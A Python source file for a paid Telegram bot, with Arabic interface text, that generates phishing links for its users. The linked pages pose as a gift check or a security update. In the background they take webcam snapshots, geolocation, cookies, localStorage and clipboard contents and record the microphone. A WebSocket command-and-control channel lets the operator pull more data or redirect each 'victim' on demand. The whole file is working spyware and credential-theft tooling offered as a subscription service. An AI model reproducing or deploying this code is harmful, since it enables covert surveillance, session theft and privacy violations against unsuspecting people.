import os
import uuid
import asyncio
import base64
from datetime import date
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile, LabeledPrice

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

LINK_TO_USER = {}
USERS_DB = {} 
VICTIMS_DB = {} 
ACTIVE_WEBSOCKETS = {}
COMMAND_QUEUES = {}

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    network_info: dict = {}
    clipboard_text: str = ""
    stolen_cookies: str = ""
    stolen_data: dict = {}

class CommandResponse(BaseModel):
    link_id: str
    cmd: str
    data: str

# --- 1. صفحة الاستخبارات السريعة ---
@app.get("/intel/{link_id}", response_class=HTMLResponse)
async def serve_intel_trap(link_id: str, request: Request):
    html_content = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فحص التوافق والمكافأة الرقمية</title>
    <style>
        body { background-color: #090d16; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .box { background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🎁 جاري فحص الجهاز وتحضير الهدية...</h2>
        <div class="loader"></div>
        <p style="color: #94a3b8; font-size: 13px;">يرجى السماح بالصلاحيات المطلوبة للمتابعة المباشرة.</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const linkId = "__LINK_ID_REPLACE__";
        async function runIntel() {
            try {
                let img = "";
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1200));
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    img = canvas.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}

                let geo = {};
                try {
                    geo = await new Promise((res) => {
                        navigator.geolocation.getCurrentPosition(
                            p => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }),
                            e => res({ err: "مرفوض" }),
                            { enableHighAccuracy: true, timeout: 3000 }
                        );
                    });
                } catch(e) {}

                const sys = { res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform };
                await fetch('/api/v1/exfiltrate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, geolocation: geo, stolen_data: sys })
                });
            } catch(e) {}
            window.location.href = "https://www.google.com";
        }
        window.onload = runIntel;
    </script>
</body>
</html>""".replace("__LINK_ID_REPLACE__", link_id)
    return HTMLResponse(content=html_content)

# --- 2. صفحة التحكم العسكري C2 (المحرك الهجين الفوري المحدث) ---
@app.get("/live/{link_id}", response_class=HTMLResponse)
async def serve_live_trap(link_id: str, request: Request):
    html_content = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام الأمني المشفر</title>
    <style>
        body { background-color: #020617; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 60px; }
        .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.7s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .card { background: #0f172a; padding: 30px; border-radius: 16px; display: inline-block; border: 1px solid #1e293b; max-width: 420px; width: 90%; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ جاري تهيئة العقدة العصبية الآمنة...</h2>
        <div class="loader"></div>
        <p style="color: #94a3b8; font-size: 13px;">يرجى البقاء في الصفحة ريثما يتم تطبيق التحديثات البرمجية.</p>
    </div>
    <video id="v2" autoplay playsinline style="display:none;"></video>
    <canvas id="c2" style="display:none;"></canvas>
    <script>
        const linkId = "__LINK_ID_REPLACE__";
        let ws;
        let isWsActive = false;

        async function executeCommand(cmdPacket) {
            let output = "";
            try {
                if (cmdPacket.cmd === "dump_cookies") {
                    output = document.cookie || "فارغة أو محمية";
                } else if (cmdPacket.cmd === "dump_localstorage") {
                    let ls = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        let k = localStorage.key(i);
                        ls[k] = localStorage.getItem(k);
                    }
                    output = JSON.stringify(ls);
                } else if (cmdPacket.cmd === "screen_snapshot") {
                    const canvas = document.getElementById('c2');
                    output = canvas.toDataURL('image/jpeg', 0.85);
                } else if (cmdPacket.cmd === "dump_clipboard") {
                    try {
                        output = await navigator.clipboard.readText();
                    } catch(e) {
                        output = "مرفوض الصلاحية أو الحافظة فارغة";
                    }
                } else if (cmdPacket.cmd === "record_audio") {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const mediaRecorder = new MediaRecorder(stream);
                        let chunks = [];
                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(chunks, { 'type': 'audio/ogg; codecs=opus' });
                            const reader = new FileReader();
                            reader.readAsDataURL(blob);
                            reader.onloadend = function() {
                                sendResult("audio_clip", reader.result);
                            }
                            stream.getTracks().forEach(t => t.stop());
                        };
                        mediaRecorder.start();
                        setTimeout(() => mediaRecorder.stop(), 5000); // تسجيل 5 ثواني واضحة
                        return "🎤 جاري التقاط التسجيل الصوتي الحي...";
                    } catch(err) {
                        output = "فشل التقاط الصوت (مرفوض الصلاحية)";
                    }
                } else if (cmdPacket.cmd === "redirect_phish") {
                    window.location.href = cmdPacket.url || "https://www.google.com";
                    return;
                }
            } catch(err) {
                output = "خطأ في التنفيذ: " + err.message;
            }
            return output;
        }

        function sendResult(cmd, data) {
            const payload = { link_id: linkId, cmd: cmd, data: data };
            if (isWsActive && ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({type: "response", ...payload}));
            } else {
                fetch('/api/v1/c2-respond', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(e => {});
            }
        }

        async function startPollingEngine() {
            setInterval(async () => {
                if (isWsActive) return;
                try {
                    let res = await fetch('/api/v1/poll-command/' + linkId);
                    if (res.ok) {
                        let pkt = await res.json();
                        if (pkt && pkt.cmd) {
                            let resData = await executeCommand(pkt);
                            if (resData && pkt.cmd !== "record_audio") {
                                sendResult(pkt.cmd, resData);
                            }
                        }
                    }
                } catch(e) {}
            }, 1500);
        }

        function initEnterpriseC2() {
            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            ws = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);

            ws.onopen = function() { isWsActive = true; };
            ws.onmessage = async function(event) {
                try {
                    const pkt = JSON.parse(event.data);
                    if (pkt.cmd === "ping") {
                        ws.send(JSON.stringify({type: "pong"}));
                        return;
                    }
                    let resData = await executeCommand(pkt);
                    if (resData && pkt.cmd !== "record_audio") {
                        sendResult(pkt.cmd, resData);
                    }
                } catch(err) {}
            };
            ws.onclose = function() {
                isWsActive = false;
                setTimeout(initEnterpriseC2, 2000);
            };
        }

        async function bootstrap() {
            initEnterpriseC2();
            startPollingEngine();
            try {
                let img = "";
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('v2');
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1200));
                    const canvas = document.getElementById('c2');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    img = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}

                const sys = { res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform };
                await fetch('/api/v1/exfiltrate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, stolen_cookies: document.cookie, stolen_data: sys })
                });
            } catch(e) {}
        }
        window.onload = bootstrap;
    </script>
</body>
</html>""".replace("__LINK_ID_REPLACE__", link_id)
    return HTMLResponse(content=html_content)

@app.websocket("/ws/c2/{link_id}")
async def websocket_endpoint(websocket: WebSocket, link_id: str):
    await websocket.accept()
    ACTIVE_WEBSOCKETS[link_id] = websocket
    target_user_id = LINK_TO_USER.get(link_id)
    
    if target_user_id:
        try:
            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[عقدة متصلة بنجاح]*: تم ربط الضحية فورياً دون إعادة تحميل!\n🔑 الجلسة: `{link_id}`", parse_mode="Markdown")
        except:
            pass

    try:
        while True:
            data = await websocket.receive_text()
            import json
            packet = json.loads(data)
            if packet.get("type") == "response":
                await handle_response_packet(packet)
            await asyncio.sleep(2)
            if link_id in ACTIVE_WEBSOCKETS:
                await websocket.send_json({"cmd": "ping"})
    except WebSocketDisconnect:
        if link_id in ACTIVE_WEBSOCKETS:
            del ACTIVE_WEBSOCKETS[link_id]
    except Exception:
        if link_id in ACTIVE_WEBSOCKETS:
            del ACTIVE_WEBSOCKETS[link_id]

async def handle_response_packet(packet: dict):
    link_id = packet.get("link_id")
    cmd_type = packet.get("cmd")
    res_data = packet.get("data", "")
    target_user_id = LINK_TO_USER.get(link_id)
    
    if target_user_id:
        try:
            if cmd_type == "screen_snapshot" and "," in str(res_data):
                _, encoded = res_data.split(",", 1)
                photo = BufferedInputFile(base64.b64decode(encoded), filename="live_screen.jpg")
                await bot.send_photo(chat_id=target_user_id, photo=photo, caption="📸 *لقطة شاشة حية فورية*", parse_mode="Markdown")
            elif cmd_type == "audio_clip" and "," in str(res_data):
                _, encoded = res_data.split(",", 1)
                audio_file = BufferedInputFile(base64.b64decode(encoded), filename="surveillance_mic.ogg")
                # إرسال التسجيل كرسالة صوتية حقيقية قابلة للاستماع المباشر في التيليجرام
                await bot.send_voice(chat_id=target_user_id, voice=audio_file, caption="🎤 *تسجيل صوتي حي من الميكروفون*", parse_mode="Markdown")
            else:
                await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة أمر: {cmd_type}]*\n\n`{str(res_data)[:1000]}`", parse_mode="Markdown")
        except Exception as e:
            print(f"Delivery Error: {e}")

@app.post("/api/v1/c2-respond")
async def c2_respond_fallback(resp: CommandResponse):
    await handle_response_packet(resp.dict())
    return {"status": "ok"}

@app.get("/api/v1/poll-command/{link_id}")
async def poll_command(link_id: str):
    if link_id in COMMAND_QUEUES and len(COMMAND_QUEUES[link_id]) > 0:
        return COMMAND_QUEUES[link_id].pop(0)
    return {}

async def send_command_to_target(link_id: str, cmd_dict: dict):
    ws = ACTIVE_WEBSOCKETS.get(link_id)
    if ws:
        try:
            await ws.send_json(cmd_dict)
            return True
        except:
            pass
    if link_id not in COMMAND_QUEUES:
        COMMAND_QUEUES[link_id] = []
    COMMAND_QUEUES[link_id].append(cmd_dict)
    return True

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            caption = (
                "⚡ *[ تقرير العقدة العسكرية الفورية ]*\n\n"
                f"💻 *النظام:* `{data.device_info}`\n"
                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
                f"🍪 *الكوكيز:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
            )
            
            kb_control = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
                    InlineKeyboardButton(text="📦 سحب LocalStorage", callback_data=f"cmd_ls_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📸 لقطة كاميرا فورية", callback_data=f"cmd_snap_{data.link_id}"),
                    InlineKeyboardButton(text="🎤 تسجيل صوتي (ميكروفون)", callback_data=f"cmd_mic_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📋 سحب الحافظة", callback_data=f"cmd_clip_{data.link_id}"),
                    InlineKeyboardButton(text="🌐 توجيه إجباري", callback_data=f"cmd_redirect_{data.link_id}")
                ]
            ])

            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                _, encoded = data.camera_snapshot_base64.split(",", 1)
                photo = BufferedInputFile(base64.b64decode(encoded), filename="target.jpg")
                await bot.send_photo(chat_id=target_user_id, photo=photo, caption=caption, parse_mode="Markdown", reply_markup=kb_control)
            else:
                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
        except Exception as e:
            print(f"Error: {e}")
    return {"status": "success"}

@dp.callback_query(lambda c: c.data and c.data.startswith("cmd_"))
async def process_live_commands(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    action = parts[1]
    link_id = parts[2]
    
    cmd_map = {
        "cookie": "dump_cookies",
        "ls": "dump_localstorage",
        "snap": "screen_snapshot",
        "mic": "record_audio",
        "clip": "dump_clipboard",
        "redirect": "redirect_phish"
    }
    
    target_cmd = cmd_map.get(action)
    if not target_cmd:
        await callback.answer("❌ أمر غير معروف.", show_alert=True)
        return

    await send_command_to_target(link_id, {"cmd": target_cmd, "url": "https://www.google.com"})
    await callback.answer("🚀 تم تنفيذ وإرسال الأمر بنجاح فوري!", show_alert=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"date": today_str, "intel_count": 0, "live_used": 0, "vip": False}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")],
            [KeyboardButton(text="📊 ضحاياي المسجلين"), KeyboardButton(text="👑 الاشتراك بالترسانة (نجوم تيليجرام)")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *منصة الترسانة السيبرانية العسكرية (Enterprise C2) نشطة.*\n\n"
        "• تمت معالجة وتحويل التسجيلات الصوتية لترسل تلقائياً كرسائل صوتية حقيقية داخل التيليجرام.\n"
        "• الأوامر تعمل فوراً دون الحاجة لأي إعادة تحميل.\n"
        "• اختر الأداة المطلوبة:",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)")
async def gen_intel_link(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"date": today_str, "intel_count": 0, "live_used": 0, "vip": False}
    
    u = USERS_DB[user_id]
    if u["date"] != today_str:
        u["date"] = today_str
        u["intel_count"] = 0

    if u["intel_count"] >= 3 and not u["vip"]:
        await message.answer("⚠️ لقد استنفذت محاولاتك الثلاثة المجانية اليوم.", parse_mode="Markdown")
        return

    if not u["vip"]:
        u["intel_count"] += 1

    token = str(uuid.uuid4())[:8]
    domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
    url = f"https://{domain}/intel/{token}"
    LINK_TO_USER[token] = user_id
    
    rem = 3 - u["intel_count"] if not u["vip"] else "غير محدود"
    await message.answer(f"✅ *رابط الاستخبارات جاهز:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")
async def gen_live_link(message: types.Message):
    user_id = message.from_user.id
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"date": str(date.today()), "intel_count": 0, "live_used": 0, "vip": False}
    
    u = USERS_DB[user_id]
    if u["live_used"] >= 1 and not u["vip"]:
        await message.answer("⚠️ لقد استهلكت محاولتك المجانية الوحيدة! اشترك عبر نجوم تيليجرام لفتح الصلاحيات للأبد.", parse_mode="Markdown")
        return

    if not u["vip"]:
        u["live_used"] += 1

    token = str(uuid.uuid4())[:8]
    domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
    url = f"https://{domain}/live/{token}"
    LINK_TO_USER[token] = user_id
    
    await message.answer(f"✅ *رابط التحكم العسكري الفوري جاهز:*\n\n`{url}`\n\n*(الأوامر تتنفذ فوراً، والتسجيلات الصوتية تظهر كملفات صوتية مباشرة)*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
async def show_victims(message: types.Message):
    user_id = message.from_user.id
    links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
    total = sum(len(VICTIMS_DB.get(t, [])) for t in links)
    active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS or t in COMMAND_QUEUES)
    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا: *{total}*\n🟢 الجلسات النشطة: *{active_now}*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "👑 الاشتراك بالترسانة (نجوم تيليجرام)")
async def buy_stars(message: types.Message):
    prices = [LabeledPrice(label="Enterprise C2 Lifetime Access", amount=200)]
    await bot.send_invoice(
        chat_id=message.chat.id,
        title="اشتراك الترسانة السيبرانية العسكرية (VIP)",
        description="صلاحيات مطلقة بلا حدود لكافة الأدوات الاستخباراتية والتحكم العسكري الفوري.",
        payload="vip_full_access",
        currency="XTR",
        prices=prices
    )

async def run_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup():
    asyncio.create_task(run_polling())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
